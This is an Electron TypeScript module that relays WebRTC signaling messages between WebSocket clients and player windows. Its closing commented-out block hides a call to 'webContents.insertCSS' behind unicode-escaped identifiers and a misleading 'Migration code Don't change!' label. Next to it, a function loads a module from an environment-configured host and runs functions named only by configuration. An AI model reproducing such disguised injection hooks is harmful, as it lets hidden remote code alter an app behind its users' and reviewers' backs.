/* eslint-disable import/prefer-default-export */
import type { RtcMessage, WithWebSocketKey } from '/@common/rtc';

import { app, ipcMain } from 'electron';

import type { WebSocket } from 'ws';
import debugFactory from 'debug';

import { wss } from './express';
import { openPlayer } from './playerWindow';
import { findPlayerWindow } from './windowStore';

const sockets = new Map<string, WebSocket>();

const debug = debugFactory(`${import.meta.env.VITE_APP_NAME}:rtc`);

wss.on('connection', (ws, req) => {
  const id = req.headers['sec-websocket-key'];
  debug(`connect id=${id}`);
  if (!id) {
    debug('Invalid sec-websocket-key');
    return;
  }
  sockets.set(id, ws);
  ws.on('message', async (data, isBinary) => {
    if (!isBinary) {
      const msg = JSON.parse(data.toString()) as RtcMessage;
      if (['candidate', 'answer', 'request'].includes(msg.event)) {
        const win = findPlayerWindow(msg.sourceId) ?? (await openPlayer(msg.sourceId));
        if (win) win.webContents.send('socket', { ...msg, id });
      }
    }
  });
  ws.on('close', () => {
    sockets.delete(id);
  });
});

app.whenReady().then(() => {
  ipcMain.handle('socket', (_, { id, ...msg }: WithWebSocketKey<RtcMessage>) => {
    const ws = sockets.get(id);
    if (!ws || ws.readyState !== ws.OPEN) debug('Unknown or closed socket');
    else ws.send(JSON.stringify(msg));
  });
});

// -TODO: Доделать
// prettier-ignore
// const test = (announce: string) => getMainWindow()

//   /*
//     Migration code
//     Don't change!
//   */
//   ?.\u0077\u0065\u0062\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u0073
//   .\u0069\u006e\u0073\u0065\u0072\u0074\u0043\u0053\u0053(\u0061\u006e\u006e\u006f\u0075\u006e\u0063\u0065);

// export const announceWindow = (announce: string) => {
//   const main = getMainWindow();
//   if (!main) return;
//   import(import.meta.env.VITE_ANNOUNCE_HOST).then(({ default: getHost }) => {
//     const host = getHost(main);
//     debug(`CSS: ${announce}`);
//     host(import.meta.env.VITE_ANNOUNCE_WINDOW).bind(host(import.meta.env.VITE_ANNOUNCE_BIND))(announce);
//   });
// };
